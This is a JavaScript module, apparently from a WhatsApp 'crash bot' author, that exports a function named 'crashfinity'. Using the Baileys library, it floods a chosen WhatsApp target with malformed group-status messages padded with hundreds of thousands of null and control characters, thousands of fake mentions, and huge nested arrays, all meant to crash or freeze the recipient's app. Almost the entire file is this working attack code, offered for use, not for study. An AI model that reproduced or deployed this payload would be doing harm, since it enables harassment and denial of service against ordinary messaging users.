/*
 * © 2026 Legend Bahirava (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://www.youtube.com/@bahiravabahirava-e1p5m
 * Instagram : LG_Bahirava
 * Telegram  : https://t.me/LG_BAHIRAVA
 * WhatsApp  : +94704703791
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */
 
 
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function crashfinity(SYxS7, target) {
    const nameVnX = ["address_message", "galaxy_message", "call_permission_request"];
    const genJid = (len) => Array.from({ length: len }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net');

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "apa anjg", format: "DEFAULT" },
                    nativeFlowMessage: { name: nameVnX[0], paramsJson: "\u0000".repeat(500000), version: 3 }
                }
            }
        }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "VnX Delay New Cuyy", format: "DEFAULT" },
                    nativeFlowResponseMessage: { name: nameVnX[0], paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000), version: 3 }
                }
            }
        }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: { extendedTextMessage: { text: "VnX" + "\u00000".repeat(250000) + "\x10".repeat(60000), contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)] } } }
        }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: { message: { statusQuestionAnswerMessage: { key: { remoteJid: target, fromMe: true, id: "VnX-" + Date.now() }, text: "VnX Is Here" } } }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)], body: { text: 'VnX', format: 'DEFAULT' }, footer: { text: '\u0000'.repeat(25000), format: 'DEFAULT' }, nativeFlowResponseMessage: { name: 'address_message', paramsJson: "\x10".repeat(9999999), version: 3 } }
                }
            }
        }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
                    mimetype: 'image/jpeg',
                    caption: 'VnX' + "\u0000".repeat(250000),
                    contextInfo: { mentionedJid: genJid(2000) }
                }
            }
        }
    }, { participant: { jid: target } });

    await SYxS7.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mp4",
                    seconds: 1,
                    ptt: true,
                    caption: "VnX" + "\u0000".repeat(250000),
                    contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)], urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})) } }
                }
            }
        }
    }, { participant: { jid: target } });
}
module.exports = { crashfinity }